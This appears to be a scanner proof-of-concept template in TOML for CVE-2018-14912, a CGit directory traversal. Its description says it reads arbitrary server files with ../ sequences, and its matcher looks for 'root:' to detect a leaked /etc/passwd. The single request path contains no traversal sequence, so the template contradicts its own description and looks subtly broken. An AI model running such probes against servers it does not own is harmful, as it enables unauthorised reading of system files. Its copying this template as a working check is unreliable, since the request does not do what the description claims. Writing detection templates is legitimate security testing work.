[info]
author = "AVE"
description = "检测 CGit 1.2.1 之前版本中 cgit_clone_objects() 函数的目录遍历漏洞，通过构造 ../ 序列读取服务器任意文件"
id = "POC-AVE-2018-0087"
name = "CGit 1.2.1 Directory Traversal PoC"
severity = "high"
tags = [
    "cve-2018-14912",
    "directory-traversal",
]
vuln_id = [
    "CVE-2018-14912",
    "AVE-2018-0087",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cgit/git/objects/"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["root:"]
